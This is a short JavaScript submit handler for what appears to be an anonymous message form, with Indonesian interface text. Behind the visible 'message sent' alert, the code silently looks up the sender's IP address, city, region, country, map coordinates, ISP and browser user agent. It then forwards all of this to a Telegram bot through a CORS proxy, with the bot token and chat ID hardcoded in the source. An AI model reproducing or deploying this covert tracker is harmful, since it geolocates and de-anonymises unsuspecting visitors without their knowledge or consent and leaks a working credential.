async function kirim() {
  const pesan = document.getElementById("pesan").value;
  if (!pesan.trim()) return alert("Pesan tidak boleh kosong!");

  try {
    const ip = await fetch("https://ipapi.co/json/").then(res => res.json());

    const hasil = `
📩 Pesan Baru Masuk:
💬 *Pesan*: ${pesan}

🌍 *IP*: ${ip.ip}
🏙️ *Kota*: ${ip.city}
🗺️ *Wilayah*: ${ip.region}
🌐 *Negara*: ${ip.country_name}
📍 *Maps*: https://www.google.com/maps?q=${ip.latitude},${ip.longitude}
🏢 *ISP*: ${ip.org}
🖥️ *Device*: ${navigator.userAgent}
    `;

    await fetch("https://corsproxy.io/?https://api.telegram.org/bot7787813252:AAHDuYArq78QFXqSSw-66L8oCO9qACyFnZk/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: 7607549215,
        text: hasil,
        parse_mode: "Markdown"
      })
    });

    alert("Pesan berhasil dikirim 😎");
    document.getElementById("pesan").value = "";

  } catch (e) {
    console.error(e);
    alert("Gagal mengirim pesan. Coba lagi.");
  }
}
